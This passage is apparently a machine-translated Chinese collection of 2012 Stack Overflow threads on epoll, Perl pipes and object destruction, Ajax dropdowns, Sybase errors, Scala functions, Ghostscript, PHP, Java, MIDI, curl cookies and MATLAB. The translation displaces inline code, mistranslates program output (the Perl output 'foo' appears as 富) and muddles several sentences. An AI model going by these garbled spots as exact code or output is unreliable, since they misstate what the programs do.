如果一个定时器到期（因为一个套接字已经 500 毫秒处于非活动状态），那么定时器将在 epoll 对象中变为“读就绪”，并导致任何等待`epoll_wait`唤醒的线程。然后，该线程可以处理定时器相关套接字的超时。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-27T07:08:47.643

听起来您正在尝试编写事件循环（如果是这样，请查看[libev](http://software.schmorp.de/pkg/libev.html) btw）。 在那里不会帮助你，你必须自己（或例如）`epoll`跟踪套接字不活动，然后每秒唤醒几次并检查你需要的一切。`clock_gettime()``gettimeofday()`

一些伪代码

```
while (1) {
    n = epoll_wait(..., 5);
    if (n > 0) {
        /* process activity */
    } else {
        /* process inactivity */
    }
} 
```

如果所有套接字都处于非活动状态，这将每秒唤醒您 200 次。

不活动检查需要一个要检查的套接字列表以及最后一个不活动的时间戳：

```
struct sockstamp_s {
    /* socket descriptor */
    int sockfd;
    /* last active */
    struct timeval tv;
};

/* check which socket has been inactive */
for (struct sockstamp_s *i = socklist; ...; i = next(i)) {
    if (diff(s->tv, now()) > 500) {
        /* socket s->sockfd was inactive for more than 500 ms */
        ...
    }
} 
```

where`diff()`为您提供 2`struct timeval`秒的差异并`now()`为您提供当前时间戳。

# perl - 如何通过命令行或脚本将 perl 脚本的输出通过管道传输到另一个

> ID：10772209
> 
> 赞同：4
> 
> 时间：2012-05-27T06:57:30.100
> 
> 标签：perl, pipe

我在 Windows 机器上（在环境路径上使用 perl 解释器）命令：

```
 perl script1.pl | perl script2.pl 
```

脚本一的内容只是：

```
 print "AAA"; 
```

脚本2的内容就是：

```
 $r = shift;
  print $r; 
```

并且该命令无法正确管道。你怎么做到这一点？此外，如果您要使用 Filehandle 执行此操作，您将如何同时从另一个脚本运行 perl 脚本。以下不起作用：

```
 open F, '| perl script2.pl AAA'; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:24:23.273

您应该从**STDIN**阅读，**shift**操纵命令行参数。

下面的代码片段解释了它。

```
cat script1.pl
print "AAA";

cat script2.pl
print <STDIN>; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:31:08.903

请记住，[`shift`](http://perldoc.perl.org/functions/shift.html)在您的主程序中，从`@ARGV`保存当前调用的命令行参数的特殊数组中删除元素。

编写*script2*作为过滤器

```
#! perl

while (<>) {
  print "$0: ", $_;
} 
```

甚至

```
#! perl -p
s/^/$0: /; 
```

要从*script1*设置管道，请使用

```
#! perl

use strict;
use warnings;

open my $fh, "|-", "perl", "script2.pl"
  or die "$0: could not start script2: $!";

print $fh $_, "\n" for qw/ foo bar baz quux /;

close $fh or die $! ? "$0: close: $!"
                    : "$0: script2 exited $?"; 
```

多参数`open`绕过了 shell 的参数解析——在 Windows 上是一个绝妙的主意*。*上面的代码假定两个脚本都在当前目录中。输出：

```
script2.pl: 富
script2.pl：酒吧
script2.pl: baz
script2.pl: quux
```

# php - 使用 Ajax 一次填充两个下拉列表

> ID：10772210
> 
> 赞同：4
> 
> 时间：2012-05-27T06:57:37.513
> 
> 标签：php, javascript, ajax

我有三个 HTML `DropDownList`( `<select><option></option></select>`)。第一个`DropDownList`包含类别，第二个包含不同产品的子类别，第三个包含品牌（或制造商）。

选择一个类别后，应根据传递给 Ajax 函数的类别 ID 一次从数据库中填充两个下拉子类别和品牌。我正在使用以下 Ajax 代码。

```
function ajax()
{
    if(window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    else
    {
        xmlhttp = new ActivexObject("Microsoft.XMLHTTP");
    }
}

function getBrandList(selected)  //selected is the category id.
{               
    ajax();
    xmlhttp.onreadystatechange=function()
    {
        if(xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.getElementById("brandList").innerHTML=xmlhttp.responseText;            
        }
    }

    xmlhttp.open("GET","ajax/BrandAjax.php?selected="+selected, true);
    xmlhttp.send();     
    alert(selected);            
}

function getSubcategoryList(selected) //selected is the category id.
{                       
    getBrandList(selected); //First above function is invoked to populate brands.
    ajax();
    xmlhttp.onreadystatechange=function()
    {
        if(xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.getElementById("subCategoryList").innerHTML=xmlhttp.responseText;                              
        }
    }

    xmlhttp.open("GET","ajax/SubCatAjax.php?selected="+selected, true);
    xmlhttp.send();             
} 
```

选择类别时，`getSubcategoryList(selected)`调用了执行AJAX请求的JavaScript函数。问题是我需要同时填充子类别和品牌下拉列表（选择类别时）。

它正在工作，并且根据传递的类别 ID 一次填充两个下拉列表（它是上述函数的参数`selected`）。

我不必要地使用了函数底部的警告框`getBrandList()`。注释此警告框时，仅填充一个子类别下拉菜单。品牌仍然是空的。我不再需要这个警报框了。

为什么会这样？解决办法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:01:00.740

我认为第二个 ajax() 调用正在清除 xmlhttp 变量。当您发出警报时，我敢打赌它会给第一个呼叫时间在开始第二个呼叫之前完成。您可能应该更早地调用 ajax() 并从您的处理程序中删除该调用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-29T17:05:54.833

首先，建议您为此尝试一些现代 JavaScript 框架，例如 JQuery。

@tzerb 怎么说：在第一个 AJAX 请求完成之前覆盖全局变量 xmlhttp 。为此，您必须使用局部变量。

```
function ajax()
{
    var xmlhttp; //!!
    if(window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    else
    {
        xmlhttp = new ActivexObject("Microsoft.XMLHTTP");
    }
    return xmlhttp; //!!
}

function getBrandList(selected)  //selected is the category id.
{               
    xmlhttp = ajax(); //!!
    xmlhttp.onreadystatechange=function()
    {
        if(xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.getElementById("brandList").innerHTML=xmlhttp.responseText;            
        }
    }

    xmlhttp.open("GET","ajax/BrandAjax.php?selected="+selected, true);
    xmlhttp.send();     
    //alert(selected);            
}

function getSubcategoryList(selected) //selected is the category id.
{                       
    getBrandList(selected); //First above function is invoked to populate brands.
    xmlhttp = ajax(); //!!
    xmlhttp.onreadystatechange=function()
    {
        if(xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.getElementById("subCategoryList").innerHTML=xmlhttp.responseText;                              
        }
    }

    xmlhttp.open("GET","ajax/SubCatAjax.php?selected="+selected, true);
    xmlhttp.send();             
} 
```

使用 JQuery，您的代码可能如下所示：

```
function getBrandsList(selected){
    $("#brandList").load("ajax/BrandAjax.php?selected="+selected);
}
function getSubcategoryList(selected){
    $("#brandList").load("ajax/SubCatAjax.php?selected="+selected);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-29T17:34:46.783

我想你可以使用回调函数。但我确实建议使用 jquery。它简单了很多。您不需要手动完成所有操作。（创建 xhttprequest 对象并维护响应状态以及所有那些笨拙的 activex 对象相关的事情）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-29T17:21:40.783

我建议您为此使用[jQuery](http://jquery.com)。

```
 1\. Load the first dropdown with categories on page load
 2\. Call the following ajax call on change event of the first dropdown, categoryList
    $('#categoryList').change(function () {
      $('#subCategoryList').load("ajax/SubCatAjax.php?selected="+this.value);
      $('#brandList').load("ajax/BrandAjax.php?selected="+$('#subCategoryList').val());
    });
 3\. Call the following ajax call on change event of the second dropdown, subcategoryList.
    $('#subCategoryList').change(function () {
      $('#brandList').load("ajax/BrandAjax.php?selected="+this.value);
    }); 
```

PS我假设您的ajax请求返回包含选项的字符串，例如。`<option value='1'>subcategory1</option><option value='2'>subcategory2</option>`..ETC。并且您想根据所选子类别而不是所选类别加载品牌。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-03T02:17:55.367

seriyPS 基本上在这方面达到了目标。问题实际上是 xmlhttp 变量。您需要在每个正在使用的函数中将其声明为本地。基本上，为函数调用创建一个闭包。然而，问题不一定是它需要是“本地的”，而是由于它是一个全局变量，它在第二个请求中被重新定义。这实质上会终止初始请求，因为变量现在指向第二个请求。

警报框使其工作的原因是因为第一个请求在您可以“单击”确定之前完成了 ajax 请求。（警告框将暂停 javascript 执行，因此会延迟第二个请求，直到您单击确定之后。）

要解决此问题，您可以修改代码以对每个请求使用不同的变量。尝试将您的功能更改为以下内容：

```
// Global Variables
var brandListRequest;
var subcategoryRequest;

function ajax()
{
    var xmlhttp; //!!
    if(window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    else
    {
        xmlhttp = new ActivexObject("Microsoft.XMLHTTP");
    }
    return xmlhttp; //!!
}

function getBrandList(selected)  //selected is the category id.
{               
    brandListRequest = ajax(); //!!
    brandListRequest.onreadystatechange=function()
    {
        if(brandListRequest.readyState==4 && brandListRequest.status==200)
        {
            document.getElementById("brandList").innerHTML=brandListRequest.responseText;            
        }
    }

    brandListRequest.open("GET","ajax/BrandAjax.php?selected="+selected, true);
    brandListRequest.send();     
    //alert(selected);            
}

function getSubcategoryList(selected) //selected is the category id.
{                       
    getBrandList(selected); //First above function is invoked to populate brands.
    subcategoryRequest = ajax(); //!!
    subcategoryRequest.onreadystatechange=function()
    {
        if(subcategoryRequest.readyState==4 && subcategoryRequest.status==200)
        {
            document.getElementById("subCategoryList").innerHTML=subcategoryRequest.responseText;                              
        }
    }

    subcategoryRequest.open("GET","ajax/SubCatAjax.php?selected="+selected, true);
    subcategoryRequest.send();             
} 
```

# sql - 尝试使用 SSIS 连接到 Sybase 时出现错误消息

> ID：10772211
> 
> 赞同：0
> 
> 时间：2012-05-27T06:57:42.443
> 
> 标签：sql, sql-server-2008, ssis

我正在使用 sql 2008 的 ssis 尝试使用 sybase 15.2 驱动程序连接到 sybase 12，我什至尝试了 sybase 12 驱动程序并得到了同样的错误

错误信息

```
[ZZZZZ]
[Message Class: 16]
[Message State: 5]
[Transaction State: 1]
[Server Name: PHXPROD]
[Native Code: 2812]
[ASEOLEDB]Stored procedure 'sp_oledb_datatype_info' not found. 
Specify owner.objectname or use sp_help to check whether the object exists (sp_help may produce lots of output). (ASEOLEDB) 
```

附加图片显示我可以连接，但连接后不久我收到错误消息

步骤1![成功连接到 Sybase](../Images/14f1d5ff0d9b4bc9da6d54cd64407098.png)

第2步![单击下一步时出现错误消息](../Images/ba1612d4632a1599ef89fc49b1fcff6e.png)

我使用 ADO.NET 时的错误消息 ![ado.net 连接到 sybase](../Images/0cbbca47c17feff12c7cf5590811e615.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:19:19.267

看起来您必须对这个问题进行更多调查，并通过阅读[SyBooks Online](http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.dc00729_1500/html/errMessageAdvRes/CHDBGEGI.htm)中的内容说：

如果`error 2812`发生在**系统存储过程**（如您的情况**sp_oledb_tables**和**sp_oledb_datatype_info**）上，则可以通过运行**installmaster**脚本来解决，该脚本会安装所有系统过程并初始化各种其他 Adaptive Server 结构。

**如何运行 installmaster 脚本？**

使用`isql`，通过输入以下命令运行此版本中包含的新 installmaster 脚本：

```
isql -Usa -P<sa password> -S<server name> -n -i$SYBASE/$SYBASE_ASE/scripts/installmaster 
-o<output file> 
```

参考：[运行 installmaster 脚本](http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.help.ase_15.0.aselxqig/html/aselxqig/aselxqig14.htm)

希望对你有帮助

# objective-c - obj-c 和 xcode 中 iPad 的全屏照片选择器？

> ID：10772212
> 
> 赞同：2
> 
> 时间：2012-05-27T06:57:55.783
> 
> 标签：objective-c, xcode, ipad

我已经实现了访问 ipad 上的相机胶卷并选择照片的常见示例（我认为）。我对显示我所有照片的小弹出窗口有点失望。您可以在 iPad 上选择壁纸和照片查看器的方式给我留下了深刻的印象。

所以我真正想要的是显示全屏相机胶卷缩略图的控件，如果您随后选择一个，它会显示全屏并带有移动和缩放选项，然后您可以选择该图像。

我可以使用这样的东西吗？我必须自己动手吗？或者是否已经内置了一些我缺少的东西？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-29T05:09:29.090

就个人而言，我非常喜欢[AGImagePickerController](https://github.com/arturgrigor/AGImagePickerController)。它很大，它是跨平台的，但最重要的是，它允许多选。

# scala - 使用方法创建函数？详细说明？

> ID：10772213
> 
> 赞同：0
> 
> 时间：2012-05-27T06:58:27.137
> 
> 标签：scala

```
def first[A] :Tuple2[A,_] => A  = ( pair :Tuple2[A,_] ) => pair._1
val name = first( ("Anna", 23) ) 
```

“如果你仔细看看第 2 行，你在这里看到的是一个方法调用，它返回一个新创建的 Tuple2[String,Any] => String 类型的函数（因为编译器启动并推断出应用所需的类型人）。虽然整个表达式看起来像一个普通的方法调用，但实际上它是一个方法调用（对一个没有任何参数的工厂方法）和一个函数调用。“——这就是上面代码的解释。

我无法推断上述过程的第一步（创建函数对象的过程）。有人可以明确地写出“人类编译器”程序吗？

编辑：我认为第 2 行的完全扩展逻辑应该是以下两行

```
val firstAsFunc= first[String]; 
val name = firstAsFunc(("Anna", 23)) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T07:09:55.420

我不确定是否进一步分解。这是我能想到的——我希望你明白，或者其他人感觉比我聪明。

```
scala> val func = first[String] // method call
func: Tuple2[String, _] => String = <function1>

scala> val name = func( ("Anna", 23) )
name: String = Anna 
```

上面的问题是它`func`实际上是一个getter——一个方法调用本身——所以我几乎没有改变任何东西。

**编辑**

我不确定你所说的*形式*参数是什么意思。该方法`first`没有值参数，只有类型参数。试图将值参数传递给它会是一个语法错误。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T11:29:29.547

当你说

```
(pair: Tuple2[A,_]) => pair._1 
```

编译器决定你实际上是在说

```
new Function1[Tuple2[A,_], A] {
  def apply(pair: Tuple2[A,_]) = pair._1
} 
```

也就是说，该`first`方法创建了一个新对象（类型为`Function1`），并调用了一个方法`apply`，然后当您说 时，该方法被透明地调用`first(...)`。（如果你写了，你会得到同样的东西`first.apply(...)`。）

（注：`Tuple2[A,_]`本身可以缩写`(A,_)`。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T08:54:04.213

我不能 100% 确定我理解您要问的过程的哪一点 - 您是在问函数对象*是*什么吗？我会假设它是:-) 来回答这个问题

函数对象是从 FunctionN ( 等) 特征之一派生`Function0`并`Function1`实现`apply`方法的对象。所以你的例子可以重写：

```
scala> def first[A]: Tuple2[A, _] => A = new Function1[Tuple2[A, _], A] { def apply(pair: Tuple2[A, _]) = pair._1 }
first: [A]=> Tuple2[A, _] => A

scala> val name = first( ("Anna", 23) )
name: java.lang.String = Anna 
```

您可以看到一个函数实际上是 FunctionN 的一个实例，如下所示：

```
scala> def foo(x: Int, y: Double): String = "x = "+ x.toString +", "+ y.toString
foo: (x: Int, y: Double)String

scala> (foo _).isInstanceOf[Function2[_, _, _]]
res1: Boolean = true 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T18:21:25.473

> 如果您仔细查看第 2 行，您在这里看到的是一个方法调用，它返回一个新创建的类型函数`Tuple2[String,Any] => String`

这个解释是错误的。第 2 行没有“返回新创建的函数”。正如 Rex Kerr 所解释的，该函数是在第 1 行创建的。

> 虽然整个表达式 [第 2 行] 看起来像一个普通的方法调用，但它实际上是一个方法调用（对一个没有任何参数的工厂方法）和一个随后的函数调用。

我不相信这是真的；没有隐藏的工厂方法，因为`Function1`对象已经在第 1 行创建。

> 我首先要问的问题之一是方法的形式参数是什么。

参见[维基百科>参数#计算机科学](http://en.wikipedia.org/wiki/Formal_parameter#Computer_science)

# pdf - GPL Ghostscript 8.70：无法启动 ijs 服务器

> ID：10772215
> 
> 赞同：1
> 
> 时间：2012-05-27T06:59:25.093
> 
> 标签：pdf, ghostscript, printer-control-language

我正在尝试使用能够配置的驱动程序让ghostscript将PDF转换为PCL-5（或5e）（内置驱动程序产生非常大的输出，我需要一些能够调整的东西）。

我已经编译了 Gutenprint，并将 ijsgutenprint 可执行文件放在`/home/marcintustin/webapps/django/oneclickcosvirt/bin/ijsgutenprint.5.2`. 当我尝试用ghostscript调用它时

```
gs -dBATCH -dNOPAUSE -dNOCIE -dSAFER -sDEVICE=ijs \ 
-sIjsServer=/home/marcintustin/webapps/django/oneclickcosvirt/bin/ijsgutenprint.5.2  \
-sDeviceManufacturer=vendor  -sDeviceModel=name -sOutputFile=- - < sztst.pdf  > sztst.pcl 
```

我得到错误`GPL Ghostscript 8.70: Can't start ijs server "/home/marcintustin/webapps/django/oneclickcosvirt/bin/ijsgutenprint.5.2"`。我很困惑，因为该文件位于给定位置，被设置为可执行文件，并且可以从命令行调用而不会出错。关于什么是错的/解决这个问题的另一种方法的任何想法？

（我在共享主机上执行此操作，我不是 root，因此我无法配置系统范围的打印，除非绝对必要，否则我不希望安装任何与打印相关的守护进程）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:24:57.203

问题是，除了`ijsgutenprint.5.2`二进制文件之外，gutenprint 还需要*在安装二进制文件的同一目录中有*一个名为`.libs`包含更多文件的目录。（`.objects`安装过程中生成的目录也不需要）。

如果执行手动安装，请注意！

# php - 在 PHP 中将关联变量推送到数组中

> ID：10772219
> 
> 赞同：1
> 
> 时间：2012-05-27T07:00:17.767
> 
> 标签：php

我有一个循环，每次循环运行时，我都需要将两个变量添加到一个数组中。我现在正在尝试的是：

```
$attach_array['outline'] = array();

foreach ($_POST['attachment'] as $key => $value) {
  $attachmentName        = $value['name'];
  $path                  = "1";
  $name                  = "alsdkjf";
  $attach_array['outline']['path']=$path;
  $attach_array['outline']['name']=$name;
} 
```

然后稍后在脚本中，我尝试为 PHPMAILER 获取这些值：

```
foreach ($attach_array['outline'] as $key => $value) {
   $mail->AddAttachment($value['path'], $value['name']);
} 
```

这个和其他尝试都不起作用，所以我希望在我的第一个循环中将 $name 和 $path 放入一个数组中以供以后使用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T07:03:25.980

您在每个循环上覆盖相同的变量。你应该这样做：

```
 $attach_array['outline'][] = array('path' => $path, 'name' => $name); 
```

通过这样做，现在所有路径和值都将作为单独的项目保留在数组中。*您不必更改使用它的代码。*

# perl - 如何在 Perl 中显式销毁对象？

> ID：10772220
> 
> 赞同：17
> 
> 时间：2012-05-27T07:00:21.080
> 
> 标签：perl, oop

假设我有一个具有 DESTROY 方法的 Perl 类。该方法用于隐式释放外部资源，例如文件句柄或数据库事务。

给定这个类的一个实例，我想明确地销毁它。这样做的主要目的是调用 DESTROY 方法，以便可以释放外部资源。然而，让“对象”本身从内存中释放将是一个额外的好处。

我怎样才能做到这一点？我考虑过直接调用 DESTROY 方法并取消定义任何引用该对象的变量。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-27T07:37:05.730

Perl5 对象在对它们的最后一个引用消失后立即被破坏，除非您有自引用结构（有关一些有趣的信息，请参阅之后的[析](http://perldoc.perl.org/perlobj.html#Destructors)构函数和*两阶段垃圾回收段落）。*

如果你没有自引用，你什么都不需要担心，该`DESTROY`方法会在需要的时候被调用；试图自己破坏对象是不安全的（你怎么能确定对象没有在其他地方引用），除非你自己也在做引用计数（如果这实际上是可能的，那将重复 perl 的努力，这不是一个好主意）。

所以我想说，只要你没有循环引用：

*   如果您想在代码中的特定点释放外部资源，请使用 ///whatever 方法（您的代码也可以调用）显式`release`执行`close`此`dispose`操作`DESTROY`。
*   如果您并不真正关心该版本是否恰好发生在您的代码中，只是它最终会被调用，请不要担心。
*   不要担心 perl 对象本身。

如果确实有循环引用，则需要更加小心，并使用弱引用（请参阅 参考资料[`Scalar::Util`](http://perldoc.perl.org/Scalar/Util.html)）来打破循环。

（换句话说，我不知道如何显式地`delete`创建一个 perl 对象。这不适用于引用计数的垃圾回收系统。）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-27T08:20:00.923

您可以使用**undef**显式销毁对象。下面的代码说明了这一点。

```
package MyPackage;

sub new {
    print "In new\n";
    return bless {};
}

sub DESTROY {
    print "In DESTROY\n";
}

package main;

my $Obj = MyPackage->new();
<STDIN>;
undef $Obj;
<STDIN>; 
```

# java - 使用 BlueJ 将 24 时钟更改为 12

> ID：10772221
> 
> 赞同：1
> 
> 时间：2012-05-27T07:00:32.600
> 
> 标签：java, oop, if-statement, clock, bluej

```
private void updateDisplay()
{   
    if(hours.getValue() == 0)
    {
        hours.setValue(12);
        displayString = hours.getDisplayValue() + ":" + 
        minutes.getDisplayValue() + " am"; 
    }
    else if(hours.getValue() < 12)
    {
        displayString = hours.getDisplayValue() + ":" + 
        minutes.getDisplayValue() + " am";
    }
    else if(hours.getValue() == 12)
    {
        displayString = hours.getDisplayValue() + ":" + 
        minutes.getDisplayValue() + " pm";
    }
    else if(hours.getValue() < 24)
    { 
        displayString = Integer.toString(hours.getValue() - 12) + ":" +  
        minutes.getDisplayValue() + " pm"; 
    }
} 
```

我只是想用这个方法来改变时钟的显示。我已经工作了几个小时但我被卡住了，因为在这个方法中由于某种原因它一直跳到 else 语句，即使值是输入满足if要求。下面我将显示我正在使用的其他课程的相关部分..编辑现在午夜滚动时不​​会留在上午

```
public int getValue()
{
    return value;
}

// Return the display value (that is, the current value as a two-digit
// String. If the value is less than ten, it will be padded with a leading
// zero).
public String getDisplayValue()
{
    if(value < 10) {
        return "0" + value;
    }
    else {
        return "" + value;
    }
}

// Set the value of the display to the new specified value. If the new
// value is less than zero or over the limit, do nothing.
public void setValue(int replacementValue)
{
    if((replacementValue >= 0) && (replacementValue < limit)) {
        value = replacementValue;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:47:07.393

我想你错过了一个`else`：

```
private void updateDisplay()
{
  if(hours.getValue() < 12)
     displayString = hours.getDisplayValue() + ":" +
            minutes.getDisplayValue() + " am";

 [this one] >>>> else if(hours.getValue() >= 12 && hours.getValue() < 25)
     displayString = Integer.toString(hours.getValue() - 12) + ":" + 
            minutes.getDisplayValue() + " pm";

  else {
    hours.setValue(12);
    displayString = hours.getDisplayValue() + ":" + 
                    minutes.getDisplayValue() + " am";
  }
} 
```

**添加：**

您还可以使用[SimpleDateFormat](http://docs.oracle.com/javase/1.4.2/docs/api/java/text/SimpleDateFormat.html)来格式化您的时间。就是这样：

```
SimpleDateFormat from = new SimpleDateFormat("H");
SimpleDateFormat to = new SimpleDateFormat("h a");

return to.format(from.parse(hours.getValue)); 
```

**补充2：**

如果您**需要**手动计算，最简单的方法是：

```
if (hours.getValue() == 0) {
    return "12 am";
} else if (hours.getValue() < 12) {
    return hours.getValue() + " am";
} else if (hours.getValue() == 12) {
    return "12 pm";
} else if (hours.getValue() < 24) {
    return (hours.getValue()-12) + " pm";
} else {
    throw new ParseException("Invalid hours value: "+hours.getValue());
} 
```

# java - 编写 MIDI 文件时如何更改乐器？

> ID：10772223
> 
> 赞同：1
> 
> 时间：2012-05-27T07:00:58.053
> 
> 标签：java, midi

我已经使用[这个](http://www.automatic-pilot.com/midifile.html)模板编写了一个编写 MIDI 文件的程序，我现在唯一遇到的问题是更换乐器

此代码段被注释为将乐器设置为钢琴，但我想知道是否有其他乐器可以使用不同的消息输入设置。

```
//****  set instrument to Piano  ****
    mm = new ShortMessage();
    mm.setMessage(0xC0, 0x00, 0x00);
    me = new MidiEvent(mm,(long)0);
    t.add(me); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-28T12:26:47.817

其他乐器在[通用 MIDI 标准](https://en.wikipedia.org/wiki/General_MIDI)中指定，但并非所有合成器都保证支持这些声音。

此外，MIDI 程序更改消息只有 2 个字节，而不是 3 个。查看您链接到的示例模板代码，似乎该`setMessage()`方法为此提供了适当的覆盖。如果您向此消息写入 3 个字节，则第 3 个字节将被错误地解释为下一条消息的第一个字节。

# php - PHP，OOP，多态性

> ID：10772229
> 
> 赞同：0
> 
> 时间：2012-05-27T07:02:12.210
> 
> 标签：php, oop, function, polymorphism

我正在研究 PHP，我正在学习的网站上有多态性示例，代码链接：[Pastebin](http://pastebin.com/fW6GMTTz)，我不明白的是为什么在那些已经用函数 hellow 扩展的类之后的 Class b 和 Class c它们已经包含这个函数，我知道这就是多态性的工作原理，我不确定，但我记得有人告诉我，同名的 2 个函数可以在一个类中，因为每个函数都有自己的签名，但是有我说我不确定是否有人可以帮助我理解它，我将非常感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:11:02.953

您在这里谈论的不是多态性，而是非常简单的继承。在某些 OOP 语言（如 Java）中，多个具有相同名称但签名不同的方法确实是可能的，但 PHP 却不行，因为 PHP 中的方法名称在一个类中是唯一的。

在您的情况下，类`b`和`c` `hello`方法将简单地替换（重载）已经定义的类和方法`a`，它们扩展。

但是，从您`b`和`c`类中，您可能希望调用父类方法。这正是这样`a::hello($arg1, $arg2, date('Y-M-j'));`做的。

# php - 卷曲多手柄和饼干

> ID：10772232
> 
> 赞同：1
> 
> 时间：2012-05-27T07:03:03.223
> 
> 标签：php, curl

我的代码创建了基本的 curl 句柄`curl_init`，然后设置了一些选项。然后我用这个句柄登录某个网站。我工作正常。当我登录时，我想访问网站上的一些资源，这些资源仅供登录的 int 用户使用。但我想同时使用`curl_multi`.

因此，在登录后`curl_copy_handle`，我使用以前登录的句柄，为复制的句柄设置新的 URL，并将复制的句柄添加到 curl 多句柄。

然后我执行 curl 多句柄 - 它可以正常工作，但无法访问成员资源 - curl_copy_handle() 似乎没有复制 cookie？

如何复制所有 cookie（在登录期间设置）以及 curl_copy_handle？

我没有在这里粘贴代码，因为它可以正常工作 - 我只需要使用多个句柄共享 cookie 的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:21:39.957

presuming that you have the correct cookie value, going from the documentation you can use curl_setopt with the CURLOPT_COOKIE value to set them for the request.

```
curl_setopt($curlhandle, CURLOPT_COOKIE, "Name=Value"); 
```

[curl-setopt function](http://us.php.net/manual/en/function.curl-setopt.php)

So just call that on your handle before performing curl_copy_handle. (there's also CURLOPT_COOKIEFILE to specify a physical cookie you saved.

I haven't ever used this myself though.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-01T09:11:33.373

在 curl_copy_handle 中使用 CURLOPT_COOKIEJAR 和 CURLOPT_COOKIEFILE。

# java - 从matlab调用java值得吗？

> ID：10772238
> 
> 赞同：3
> 
> 时间：2012-05-27T07:03:47.587
> 
> 标签：java, performance, matlab, comparison

# 问题背后的原因

对于物理项目，我们想要分析两个曲面（由一堆顶点指定）并计算这些曲面之间的体积。为了能够做到这一点，我们想要实现一个二维区间搜索树。总的渐近运行时间将接近 O(n ² log n)。

# 问题

总之，我们将实现一个算法，这将非常耗时。此外，该算法并没有从 matlab 中高度优化的数学库中受益。因此，我们正在考虑从matlab中调用Java。最后，我们想知道：

“忽略 matlab 中数学库的高度优化性能，Java 比 matlab 快到什么程度？”

和

“从matlab重复调用java方法时是否有任何明显的延迟？”

例如，每次调用该方法时都必须启动 JVM 吗？每次调用该方法时都必须加载 jar 吗？

我希望你们中的一些人可以帮助我（也许还有其他人）这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:47:53.490

我之前曾多次在 MATLAB 命令行中使用 Java 类。我不知道每次进行 Java 调用时是否会重新启动 JVM，我也没有测量与执行独立 Java 类相比延迟有多少。但是，我根本没有“感觉到”任何缓慢。

您似乎需要为您的问题创建自定义数据结构，这是您无法使用 MATLAB 轻松或有效地完成的事情。另一个有助于决定使用哪个的问题是：使用 Java 还是使用 Matlab 开发会更快吗？如果这个问题的答案是 Java，我肯定会建议使用 Java。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T22:46:22.950

如果您决定在 MATLAB 中编写实现，这里有一些非常好的观点[@AndrewJanke](https://stackoverflow.com/a/1745686/97160)在 MATLAB 中的 OOP 性能的一个很好的答案中提出（值得阅读整篇文章）：

> 在 MATLAB 中模仿 C++ 或 Java 类可能不是最优的。Java/C++ 类的构建通常使对象成为最小的构建块，尽可能具体（即，许多不同的类），并且将它们组合成数组、集合对象等，并使用循环对其进行迭代。要制作快速的 MATLAB 类，请彻底改变这种方法。拥有更大的类，其字段是数组，并在这些数组上调用矢量化方法。
> 
> 重点是安排您的代码以发挥语言的优势——数组处理、矢量化数学——并避免弱点。

为了回答您的问题，我引用了文档：

> 在 MATLAB 启动时，部分 MATLAB 虚拟地址空间由 Java 虚拟机 (JVM) 保留，不能用于存储 MATLAB 数组。

所以它只在启动时初始化一次。

在调用 Java 方法而不是 M 文件时也会产生开销（因为 MATLAB 类型必须与 Java 数据类型进行编组）。

现在，如果您想挤出最后一点性能，请确保将 Java 方法调用为：

```
func(obj) 
```

代替：

```
obj.func() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T19:59:14.540

这个问题似乎非常适合并行性。为什么 Java 是您首先考虑的唯一替代方案？我认为您应该了解初始代码的性能如何，并在必要时考虑使用 MATLAB 的一些内置 GPU 功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T07:48:10.797

我建议您尝试以您认为最简单的方式实现原型，并看看它的性能如何。如果性能明显不够好，请尝试替代方法，看看是否更好。

（很难对这样的事情做出一般性预测，因为真正的答案通常严重依赖于问题的细节和您的设计。另一方面，您可能会发现您没有获得足够的加速据称更有效的方法来证明努力的合理性。）

# java - 如何在运行时更改页面格式？（jasperreport）

> ID：10772240
> 
> 赞同：7
> 
> 时间：2012-05-27T07:04:02.470
> 
> 标签：java, jasper-reports

我在 iReport4.5 中创建了一个 A4 格式的报告页面并在 java 应用程序中使用。

java - 如何在Java应用程序的运行时将A4格式更改为A5格式？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-28T17:39:09.197

